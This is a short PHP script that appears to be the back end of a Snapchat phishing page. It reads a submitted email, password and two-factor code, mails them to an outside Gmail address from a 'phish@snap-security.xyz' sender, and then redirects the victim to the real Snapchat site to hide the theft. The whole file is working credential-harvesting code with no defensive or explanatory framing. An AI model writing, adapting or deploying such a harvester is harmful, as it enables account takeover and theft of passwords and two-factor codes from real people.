<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST["email"];
    $password = $_POST["password"];
    $twofa = $_POST["twofa"];
    $data = "Email: $email | Password: $password | 2FA: $twofa\n";
    mail("realdrywest@gmail.com", "Snapchat Creds", $data, "From: phish@snap-security.xyz");
    header("Location: https://www.snapchat.com");
    exit();
}
?>